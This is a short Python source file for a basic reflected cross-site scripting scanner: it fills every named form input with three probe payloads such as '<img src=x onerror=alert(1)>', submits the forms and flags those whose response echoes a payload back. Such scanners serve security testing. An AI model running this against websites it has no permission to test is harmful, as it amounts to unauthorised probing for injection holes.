import requests
from urllib.parse import urljoin

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml"
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]


def scan_xss(url, forms):
    vulnerable_forms = []

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        target_url = urljoin(url, action)

        for payload in XSS_PAYLOADS:
            data = {}

            for input_tag in form["inputs"]:
                if input_tag["name"]:
                    data[input_tag["name"]] = payload

            try:
                if method == "post":
                    res = requests.post(target_url, data=data, headers=HEADERS, timeout=5)
                else:
                    res = requests.get(target_url, params=data, headers=HEADERS, timeout=5)

                if payload.lower() in res.text.lower():
                    vulnerable_forms.append({
                        "action": action,
                        "method": method,
                        "payload": payload
                    })
                    break

            except requests.exceptions.RequestException:
                pass

    return vulnerable_forms
